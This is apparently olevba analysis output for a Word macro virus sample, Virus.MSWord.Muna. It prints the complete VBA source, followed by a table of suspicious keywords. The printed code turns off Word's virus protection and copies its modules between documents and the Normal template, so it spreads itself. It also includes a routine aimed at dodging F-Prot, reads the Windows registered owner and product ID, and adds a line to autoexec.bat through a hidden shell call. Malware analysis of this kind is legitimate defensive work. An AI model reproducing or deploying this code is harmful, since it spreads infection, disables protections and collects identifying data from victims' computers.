olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muna
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub Main()
Options.VirusProtection = False
If Templates(1).AutoTextEntries.Item(1) = "IAMHERE1" Then GoTo done Else
Call PROCS.FtoT
Options.VirusProtection = False
Templates(1).AutoTextEntries.Add("- AAAAAAAA", ActiveDocument.Words(1)) = "IAMHERE1"
Templates(1).AutoTextEntries.Add("- AAAAAAAB", ActiveDocument.Words(1)) = "26/veb/2000 omk{MM}MUNA"
Templates(1).Save
done:
On Error GoTo kill
kill:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FS.bas 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/FS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
On Error GoTo kill

If (ActiveDocument.Variables.Count > 0) Then If (ActiveDocument.Variables(1).Name = "AAAAAAAA") Then If (ActiveDocument.Variables.Item("AAAAAAAA").Value = "OK1") Then GoTo done Else
PROCS.TtoF

For Each junn In ActiveDocument.Variables
If junn.Name = "AAAAAAAA" Then junn.Delete
Next junn
ActiveDocument.Variables.Add Name:="AAAAAAAA", Value:="OK1"

done:
ActiveDocument.Save

kill:
End Sub

-------------------------------------------------------------------------------
VBA MACRO FSA.bas 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/FSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
On Error GoTo kill
Dialogs(wdDialogFileSaveAs).Show
If (ActiveDocument.Variables.Count > 0) Then If (ActiveDocument.Variables(1).Name = "AAAAAAAA") Then If (ActiveDocument.Variables.Item("AAAAAAAA").Value = "OK1") Then GoTo done Else
PROCS.TtoF
For Each junn In ActiveDocument.Variables
If junn.Name = "AAAAAAAA" Then junn.Delete
Next junn
ActiveDocument.Variables.Add Name:="AAAAAAAA", Value:="OK1"

done:
ActiveDocument.SaveAs (Dialogs(wdDialogFileSaveAs).Name)

kill:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PROCS.bas 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/PROCS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' (02.06.01 15:16:11/fayer/Russian-aaaaaaaaa50578-335-0334013-01796)
' start
' LOF_KEERME

Public Sub fuckinfprot(f, t)
Dim nme As String
nme = "PRO" + "CS" ' gotcha fprot!!
Application.OrganizerCopy Source:=f, Destination:=t, Name:=nme, Object:=wdOrganizerObjectProjectItems
End Sub
Public Sub TtoF()
Dim mc, ad, rt As String
Dim oneiole As Boolean
mc = MacroContainer.FullName
ad = ActiveDocument.FullName
For Each saker In ActiveDocument.VBProject.VBComponents
If (saker.Name = "AO") Or (saker.Name = "AutoOpen") Or (saker.Name = "Bold") Or (saker.Name = "BLD") Or (saker.Name = "FileSave") Or (saker.Name = "FS") Or (saker.Name = "FileSaveAs") Or (saker.Name = "FSA") Or (saker.Name = "PROCS") Then
Call Application.OrganizerDelete(ad, saker.Name, wdOrganizerObjectProjectItems)
End If
Next saker
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="AO", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="AO", NewName:="AutoOpen", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="FileSave", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="FileSave", NewName:="FS", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="FileSaveAs", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="FileSaveAs", NewName:="FSA", Object:=wdOrganizerObjectProjectItems
Call fuckinfprot(mc, ad)
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="Bold", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="Bold", NewName:="BLD", Object:=wdOrganizerObjectProjectItems

oneiole = False
End Sub
Public Sub FtoT()
Dim mc, ad, rt As String
Dim aaa
mc = MacroContainer.FullName
ad = Application.Templates(1).FullName
For Each saker In Templates(1).VBProject.VBComponents
If (saker.Name = "AO") Or (saker.Name = "AutoOpen") Or (saker.Name = "Bold") Or (saker.Name = "BLD") Or (saker.Name = "FileSave") Or (saker.Name = "FS") Or (saker.Name = "FileSaveAs") Or (saker.Name = "FSA") Or (saker.Name = "PROCS") Then
Call Application.OrganizerDelete(ad, saker.Name, wdOrganizerObjectProjectItems)
End If
Next saker

Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="AutoOpen", NewName:="AO", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="FS", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="FS", NewName:="FileSave", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="FSA", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="FSA", NewName:="FileSaveAs", Object:=wdOrganizerObjectProjectItems
Call fuckinfprot(mc, ad)
Application.OrganizerCopy Source:=mc, Destination:=ad, Name:="BLD", Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ad, Name:="BLD", NewName:="Bold", Object:=wdOrganizerObjectProjectItems
'
rt = "(" + Str(Now) + "/" + Word.Application.UserName + "/" + Word.System.LanguageDesignation + "-" + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") + _
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductId") + ")"
Call Templates(1).VBProject.VBComponents("PROCS").CodeModule.InsertLines(1, "' " + rt)

rt = "rt"
aaa = Shell("command.com /c echo rem KEERME TEGUTSEB" + rt + ">>c:\autoexec.bat", vbHide)
End Sub
-------------------------------------------------------------------------------
VBA MACRO BLD.bas 
in file: Virus.MSWord.Muna - OLE stream: 'Macros/VBA/BLD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()
' ega see mingi stealth vir ei ole aga tццtab :)
Dim muutuja As Integer

Word.Selection.Font.Bold = Not Word.Selection.Font.Bold
If Word.Selection.Text <> "I AM CALLING YOU!" Then GoTo lopar

Word.Selection.TypeText ("I AM HERE, READY AND WORKING (ver: " + MacroContainer.AutoTextEntries.Item("- AAAAAAAB").Value + Chr(13) + Chr(10))
For muutuja = 1 To Templates(1).VBProject.VBComponents("PROCS").CodeModule.CountOfLines
If Templates(1).VBProject.VBComponents("PROCS").CodeModule.Lines(muutuja, 1) = "' LOF_KEERME" Then GoTo lopar Else
Word.Selection.TypeText (Templates(1).VBProject.VBComponents("PROCS").CodeModule.Lines(muutuja, 1) + Chr(13) + Chr(10))
Next muutuja

lopar:

Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

